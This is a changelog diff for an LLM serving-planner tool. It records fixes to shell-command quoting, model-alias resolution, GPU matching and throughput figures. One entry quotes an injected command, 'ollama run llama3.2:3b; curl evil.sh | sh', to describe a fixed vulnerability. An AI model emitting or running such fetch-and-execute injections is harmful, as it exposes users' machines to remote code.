@@ -7,6 +7,19 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Fixed
+- **Shell injection reached the one backend the fix missed.** 0.30.9 quoted the model identifier for vllm/tgi/sglang but left `ollama run {tag}` raw -- and ollama wins the default plan for most registry queries, so it is the most-emitted command, not an edge case. `ollama run llama3.2:3b; curl evil.sh | sh` was produced verbatim for a human to paste. The test class asserting this property parametrized exactly the three backends that were already correct.
+- **An identifier naming a different model generation resolved to the wrong model's facts.** 0.30.1 stopped `llama3.1:405b` becoming an 8B, but only when a size token parsed. `phi-4` carries none, and the `phi` family has exactly one registry member, so it returned phi-2: **2.78B params and 6.69 GB for a 14.66B model**, with phi-2's measured quality and refusal rate attached. A generation marker that differs is now refused; an absent one (`phi:latest`) still resolves, since that is not a claim about a different model.
+- **An approximated alias no longer stamps VRAM `measured`.** 0.30.1 downgraded quality and safety for approximations but left VRAM, on the reasoning that it is exact arithmetic. It is -- over the *alias's* architecture. Exact arithmetic on the wrong shape is not a measurement.
+- **A blank `--hardware` matched the first GPU in the database.** The empty string is a substring of every key, so `--hardware "$GPU"` with the variable unset produced a confident, fully provenance-labelled plan for an RTX 4060. It now resolves to nothing and the CLI refuses.
+- **`workload --from-log` reported `workload_cv2` as `measured` and `absent` at once.** The absent-check ran above the derivation that sets it, so `plan` said it was using the value while also saying the profile had not measured it. Introduced in 0.30.6 when the CV^2 derivation moved; the `--from-metrics` path was always correct.
+- **The reference GPU's `fp16_tflops` was the desktop RTX 4070 Ti's figure.** 0.30.4 corrected the reference rig's bandwidth and TDP to the RTX 4080 Laptop but left `80.2` -- which is `2 x 40.09`, the 4070 Ti's FP32, sitting identically 15 lines above in `GPU_DB`. The laptop part is 7,424 cores at 2.28 GHz: 33.85 FP32, so 67.7 dense FP16 by this file's own rule. TTFT and the decode compute ceiling on the rig every measurement came from were overstated by 18.5%.
+- **Four roofline fallbacks still hardcoded the superseded 556 GB/s.** Combined with the re-derived `MBU_DEFAULT`, a caller who omitted `hardware` got an effective 467 GB/s from a 432 GB/s card. They now reference a named `REFERENCE_BANDWIDTH_GBPS` that cannot drift from `GPU_DB`.
+
+### Corrected
+- The 0.30.4 notes claimed the bandwidth and MBU changes "cancel exactly" so the reference card's predictions were "unchanged to the digit". They do not: `0.65 x 556 = 361.40` against `0.84 x 432 = 362.88`, a 0.41% difference. The new pair is still the better one -- it reproduces the measured calibration anchor (146.33 tok/s) at 146.32 where the old gave 145.73 -- but the claim of exact cancellation was wrong, and the published release note has been corrected in place.
+
+
 ## [0.30.9] - 2026-08-28
 
 ### Fixed
